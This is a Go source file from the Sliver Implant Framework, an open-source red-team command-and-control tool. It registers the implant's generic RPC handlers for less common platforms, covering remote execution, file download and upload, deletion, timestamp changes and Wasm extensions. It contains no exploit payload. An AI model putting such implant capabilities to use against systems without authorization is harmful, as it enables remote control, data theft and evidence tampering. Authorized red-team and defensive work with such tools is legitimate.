//go:build !(linux || darwin || windows)

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	----------------------------------------------------------------------

	This file contains only pure Go handlers, which can be compiled for any
	platform/arch.

*/

import (
	"os"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	genericHandlers = map[uint32]RPCHandler{
		sliverpb.MsgPing:           pingHandler,
		sliverpb.MsgLsReq:          dirListHandler,
		sliverpb.MsgDownloadReq:    downloadHandler,
		sliverpb.MsgUploadReq:      uploadHandler,
		sliverpb.MsgCdReq:          cdHandler,
		sliverpb.MsgPwdReq:         pwdHandler,
		sliverpb.MsgRmReq:          rmHandler,
		sliverpb.MsgMkdirReq:       mkdirHandler,
		sliverpb.MsgMvReq:          mvHandler,
		sliverpb.MsgCpReq:          cpHandler,
		sliverpb.MsgExecuteReq:     executeHandler,
		sliverpb.MsgSetEnvReq:      setEnvHandler,
		sliverpb.MsgEnvReq:         getEnvHandler,
		sliverpb.MsgUnsetEnvReq:    unsetEnvHandler,
		sliverpb.MsgReconfigureReq: reconfigureHandler,
		sliverpb.MsgChtimesReq:     chtimesHandler,
		sliverpb.MsgGrepReq:        grepHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
	}
)

// GetSystemHandlers - Returns a map of the generic handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return genericHandlers
}

// GetSystemPivotHandlers - Not supported
func GetSystemPivotHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// Stub
func getUid(fileInfo os.FileInfo) string {
	return ""
}

// Stub
func getGid(fileInfo os.FileInfo) string {
	return ""
}
